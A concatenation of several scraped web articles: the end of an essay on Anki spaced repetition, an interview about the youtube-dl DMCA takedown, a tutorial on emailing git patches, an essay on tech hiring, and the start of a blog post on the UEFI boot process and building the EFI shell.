	improvements. That said, I do believe the underlying
	principles are powerful and important and deserve serious
	consideration.
      </p>
      -->
    
      <p>
	At first glance, Anki seems nothing more than a computerized
      flashcard program. You enter a question:
    </p>

   <p><img src="http://augmentingcognition.com/assets/Anki_question.png"></p><p>
      And a corresponding answer:
    </p>

    <p><img src="http://augmentingcognition.com/assets/Anki_answer.png"></p><p>
      Later you'll be asked to review the card: that is, shown the
      question, and asked whether you know the answer or not.
    </p>

    <p>
      What makes Anki better than conventional flashcards is that it
      manages the review schedule. If you can answer a question
      correctly, the time interval between reviews gradually
      expands. So a one-day gap between reviews becomes two days, then
      six days, then a fortnight, and so on. The idea is that the
      information is becoming more firmly embedded in your memory, and
      so requires less frequent review. But if you ever miss an
      answer, the schedule resets, and you again have to build up the
      time interval between reviews.
    </p>

    <p>
      While it's obviously useful that the computer manages the
      interval between reviews, it perhaps doesn't seem like that big
      a deal.  The punchline is that this turns out to be a far more
      efficient way to remember information.
    </p>

    <p>
      How much more efficient?
    </p>

    <p>
      To answer that question, let's do some rough time estimates.  On
      average, it takes me about 8 seconds to review a card. Suppose I
      was using conventional flashcards, and reviewing them (say) once
      a week. If I wanted to remember something for the next 20 years,
      I'd need 20 years times 52 weeks per year times 8 seconds per
      card. That works out to a total review time of just over 2 hours
      for each card.
    </p>

    <p>
      By contrast, Anki's ever-expanding review intervals quickly rise
      past a month and then out past a year. Indeed, for my personal
      set of Anki cards the average interval …</p></div></div>

As such it is usually considered lawful to freely distribute the software itself. There are many other places you can find copies of this software besides the current maintainers GitHub page.</p><div><p>The notice claimed the youtube-dl software was a ‘Anticircumvention Violation’ as well as a violation of YouTube’s terms of service. It requested that:</p><p><em>“In light of the above noted copyright infringements and anticircumvention violations, we ask that you immediately take down and disable access to the youtube-dl source code at all of its locations where it is hosted on GitHub, including without limitation those locations in the representative list set forth above.”</em></p></div><p>It also draws attention to the examples featured in the youtube-dl source code which include examples of how to download copyrighted music from Icona Pop, Justin Timberlake and Taylor Swift. The notice also claimed that:</p><p><em>“The clear purpose of this source code is to (i) circumvent the technological protection measures used by authorised streaming services such as YouTube, and (ii) reproduce and distribute music videos and sound recordings owned by our member companies without authorization for such use.”</em></p><p>Although the youtube-dl software cannot be used to distribute music, only to reproduce it.

However, there are a number of technical inaccuracies in that letter; in particular the lawyers did not seem to have understood that my maintainership of youtube-dl ended years ago. Since this is an ongoing legal issue, that's all I'll say about that.</blockquote><p><strong>Are you going to change the examples in the source code and remove references to the copyrighted works of Icona Pop, Justin Timberlake and Taylor Swift?</strong></p><blockquote>I am no longer involved in the youtube-dl project, but if I were:</blockquote><blockquote>I would remove the test cases. These videos were never fully downloaded anyways; they are automated test cases where the test just downloads the first 10KB, which amounts to a couple of seconds at most. This is certainly fair use, but the project is fully functional without these test cases.</blockquote><blockquote>I would remove the referenced code, even though I believe it to be legal. It's an extremely small part of youtube-dl (which despite the name supports over 1000 other sites apart from YouTube) and not worth the trouble for me. I respect those who argue that the code should remain unchanged though, or that only music videos should be excluded.</blockquote><p><strong>Do you have any other comments about the incident?</strong></p><blockquote>youtube-dl is very valuable for many purposes: It enables video playback on devices where the web interface is not suitable (e.g. Raspberry Pis), it allows playback for disabled users, it powers research projects which analyze videos, and you can just watch videos when there may be no stable Internet connection. This should be unequivocally allowed and even supported for the good of society, while keeping the ability of content producers to benefit from their creations.</blockquote><blockquote>In my time as maintainer, I declined numerous requests to support piracy sites and DRM-protected content. I can not speak for the project in the last years, but from what I've seen that policy has remained. To me, this is the right policy any legal project should follow.</blockquote><blockquote>In some locations, judges seem to have interpreted the law to be something it does not say. It should be clarified – whether by judges or lawmakers – to what is written down already and was intended: Proper DRM should not be subverted except for archiving purposes, but anything else is clearly allowed. Personally, I would go so far to require DRM schemes to decode timestamp and licenses to enable archiving.

They hosted the project for free, and we should thank them for that. I can understand that some people don't want to deal with the RIAA – maybe they are not even located in the US – and simply move the source code somewhere else, but I greatly appreciate GitHub's services and support.

I hope somebody takes up the flag, source code, and distribution of youtube-dl, but I understand if Sergey doesn't want to deal with all of this trouble. Due to other personal &amp; open-source commitments as well as the ongoing legal affairs, I'm sad it can't be me. I wish the project all the best.</blockquote><blockquote>Copyright law is always a balance between creators and society. When it comes to being able to watch videos no matter the device or Internet connection, and doing so for non-commercial purposes, the balance we should strive for seems clear to me; it should allow youtube-dl.</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>touch original.txt new.txt</span><br><span><span>echo</span> <span>"New addition"</span> &gt; new.txt</span><br></pre></td></tr></tbody></table></figure>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>diff original.txt new.txt -u &gt; changes.patch</span><br></pre></td></tr></tbody></table></figure>
<figure><figcaption><span>changes.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+New addition</span></span><br></pre></td></tr></tbody></table></figure>
<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>
<figure><figcaption><span>0001-Added-Tarun-Batra-to-contributors.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span>From 619814a3ac21012580e725136864e8397c14e20b Mon Sep 17 00:00:00 2001</span><br><span>From: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date: Tue, 20 Oct 2020 23:15:32 +0200</span><br><span>Subject: [PATCH] Added Tarun Batra to contributors</span><br><span></span><br><span></span><br><span> CONTRIBUTORS.txt | 1 +</span><br><span> 1 file changed, 1 insertion(+)</span><br><span></span><br><span>diff --git a/CONTRIBUTORS.txt b/CONTRIBUTORS.txt</span><br><span>index e69de29..1d12219 100644</span><br><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span></span><br><span><span>--</span></span><br><span>2.28.0</span><br></pre></td></tr></tbody></table></figure>
<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>
<figure><figcaption><span>git log</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>Author: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date:   Tue Oct 20 23:15:32 2020 +0200</span><br><span></span><br><span>    Added Tarun Batra to contributors</span><br><span></span><br><span>    Signed-off-by: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>

<article id="post-193">

	

	
	<div>
		
<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re a brilliant engineer who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A poorly-designed take-home, requiring skills that you don’t have and won’t need for the job, and that you spend hours thinking through and working on, send in, and get rejected without getting any feedback.</li></ul>



<p>Probably neither.</p>



<p><strong>So …</strong></p></div></article></main></section></div></div>

	<section>

<p>Some people may think some of my past posts get into the weeds, exploring the technical depths of Windows Autopilot, Intune, Windows 10, ConfigMgr, etc.&nbsp; But I would say those generally only get to the 300-level – I will leave out the really deep stuff because it can be harder to explain, and some people just might not care.&nbsp; But every so often, in an effort to maintain my sanity, I like to dive into a new topic to prove that I am still capable of learning new stuff and spending more than 30 minutes on said topic.&nbsp; And in this case, anyone reading this blog post will be coming along for the ride.&nbsp; We’ll see how many people make it all the way to the “end of the road.”</p>



<p>So what’s the topic?&nbsp; Something that I <a href="https://blogs.technet.microsoft.com/mniehaus/2011/06/10/mdt-2012-beta-1-uefi-support/" target="_blank">started talking about almost 10 years ago</a>, the Unified Extensible Firmware Interface (UEFI).&nbsp; Back then, it was more of a warning:&nbsp; The way you deploy Windows is going to change.&nbsp; Now, it’s a way of life (and fortunately, it no longer sucks like it did back in 2010 when we first started working with it).</p>



<p>I don’t want to rehash the “why’s” behind UEFI because frankly, you no longer have much of a choice:&nbsp; All new Windows 10 devices ship with UEFI enabled by default (and if you are turning it off, shame on you).&nbsp; Instead, I want to focus much more on how it works and what’s going on behind the scenes.</p>



<h3>Chapter 1: The boot process</h3>



<p>According to <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_8_final.pdf" target="_blank">the UEFI spec</a> (which is a really hard to follow document), a device will initially start up and look for a particular file based on the architecture of the system:</p>



<figure><table><tbody><tr><td>Architecture</td><td>File</td></tr><tr><td>x86 (32-bit)</td><td>bootia32.efi</td></tr><tr><td>x64 (64-bit)</td><td>bootx64.efi</td></tr><tr><td>ARM (32-bit)</td><td>bootarm.efi</td></tr><tr><td>ARM (64-bit)</td><td>bootaa64.efi</td></tr></tbody></table></figure>



<p>It will look in the \EFI\BOOT folder on accessible FAT32 volumes for this file.&nbsp; (The firmware can only read FAT32 file systems.&nbsp; GPT disks are suggested, although interestingly enough MBR disks would probably work too, at least per the UEFI spec.)&nbsp; That’s effectively a fallback mechanism – if nothing else loaded, search out something.&nbsp; But once you’ve installed an OS on the device, it will create firmware entries that provide alternative choices; UEFI will work its way down the list until it successfully loads one.&nbsp; Here’s what you would see for that firmware order on a Hyper-V VM that’s already running Windows 10:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb.png" alt="image"></a></figure>



<p>Notice that the first entry in the list points to \EFI\Microsoft\Boot\bootmgfw.efi, the Microsoft-provided boot manager; it then decided what OS to boot from the BCD.&nbsp; An interesting fact:&nbsp; If you look at the bootmgfw.efi file and compare it against the bootx64.efi file (you’ll have to assign a drive letter to the EFI partition to see these files), you’ll notice that they are exactly the same size:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-1.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-1.png" alt="image"></a></figure>



<p>That’s not a coincidence – they are actually the exact same file.&nbsp; So whether it’s loaded as a “last resort” by the firmware (bootx64.efi) or by the explicit firmware entry doesn’t matter, it does the same thing either way.&nbsp; </p>



<p>The boot manager will then boot an OS based on the BCD entries.&nbsp; For a Windows 10 OS, there will be an entry in the BCD that points to a particular volume as well as the path of the Windows boot loader that actually boots the OS, which is typically \windows\system32\winload.efi on that volume.&nbsp; Here’s the entry from my laptop:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-2.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-2.png" alt="image"></a></figure>



<p>Behind the scenes, that “partition=c:” entry really points to the ID of the volume (since drive letter assignments depend on the OS mappings, not the BCD or loader); BCDEDIT is making it more friendly.&nbsp; When winload.efi is loaded, it will find the actual Windows kernel and load it, which starts the actual OS boot process.</p>



<p>There’s one other interesting file that can come into play, hvloader.efi.&nbsp; This one is tied to the “hypervisorlaunchtype” BCD setting about.&nbsp; This one is for the Hyper-V hypervisor.&nbsp; The winload.efi boot loader will check this setting and automatically load hvloader.efi to launch the hypervisor.&nbsp; The exact mechanism for that isn’t 100% clear to me – that was a rabbit hole I didn’t want to go down.&nbsp; </p>



<p>One other point worth mentioning in this process:&nbsp; If secure boot is enabled, all of the mentioned files will be checked to make sure that they are properly signed and unmodified.&nbsp; If the boot process gets far enough for the NTOS kernel to run, it will also perform verification of critical boot files.&nbsp; This is a key UEFI and Windows security feature, and why you should always run with UEFI and Secure Boot enabled, except when testing or playing (and we’ll do plenty of that later).</p>



<h3>Chapter 2: What are these EFI files anyway?</h3>



<p>I remember reading in the UEFI specifications a long time ago that UEFI used <a href="https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface" target="_blank">“EFI byte code” (EBC)</a>.&nbsp; That would mean special tools, compilers, etc.&nbsp; Well, I was wrong.&nbsp; Yes, such a thing exists, but it’s primarily for cross-platform drivers, and apparently is not used very often.&nbsp; So these EFI files (like bootmgfw.efi) are just typical executables, and can be written in any language and compiled into something that’s pretty close to a standard binary.&nbsp; C and assembly language are the most common languages used, and both are used in the <a href="https://github.com/tianocore/edk2" target="_blank">source code for UEFI itself</a> (the EDK2 repository, part of the <a href="https://www.tianocore.org/" target="_blank">Tianocore project</a>).</p>



<p>At the moment at least, my interest isn’t in writing UEFI code.&nbsp; But there is one piece of UEFI code that would come in very handy to explore some of the “behind the scenes” operations of UEFI: the EFI shell.&nbsp; Think of this as a sort of “UEFI command prompt” that has a number of built-in commands for working with UEFI itself.&nbsp; The source code is included in the EDK2 project, it just needs to be built (compiled/linked).</p>



<p>OK, so how to build it?&nbsp; There are <a href="https://github.com/tianocore/tianocore.github.io/wiki/Windows-systems" target="_blank">some instructions in the Tianocore Github content</a>.&nbsp; Those instructions are OK, but not perfect.&nbsp; Here’s a high-level summary of what I did:</p>



<ul><li>Install Visual Studio 2019 (even though it isn’t listed as officially supported in the EDK2 documentation – that stops at Visual Studio 2017).&nbsp; Make sure you install the desktop development tools.&nbsp; (I included MSVC v141, which is the VS2017 version.&nbsp; I think that was necessary, just didn’t take the time to prove it.)</li><li>Install <a href="https://www.python.org/" target="_blank">Python 3.7</a> or later to C:\Program Files\Python37.&nbsp; Set a system environment variable PYTHON_HOME to “C:\Program Files\Python37” (without the quotes, without a trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Nasm-Setup" target="_blank">NASM open-source assembly compiler</a> to C:\Program Files\NASM.&nbsp; Set a system environment variable NASM_PREFIX to “C:\Program Files\NASM\” (without the quotes, with the trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Asl-Setup" target="_blank">ASL compiler</a> to C:\ASL</li><li>Install <a href="http://git-scm.com/download/win" target="_blank">Git GUI</a>.&nbsp; </li><li>Clone the EDK2 repository from Git GUI, specifying a source location of <a title="https://github.com/tianocore/edk2.git" href="https://github.com/tianocore/edk2.git">https://github.com/tianocore/edk2.git</a> and a target of C:\EDK2.</li><li>Edit the “C:\EDK2\Conf\target.txt” file to specify the following values:
<p>ACTIVE_PLATFORM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = MdeModulePkg/MdeModulePkg.dsc<br>TARGET_ARCH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = X64</p></li></ul>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat Rebuild”.</li><li>Run “build”.</li></ul>



<p>If all of that works, you should then have a full build of the main UEFI code.&nbsp; But you still won’t have the UEFI shell.&nbsp; So a little more is required:</p>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat”.</li><li>Run “build -p ShellPkg\ShellPkg.dsc”</li></ul>



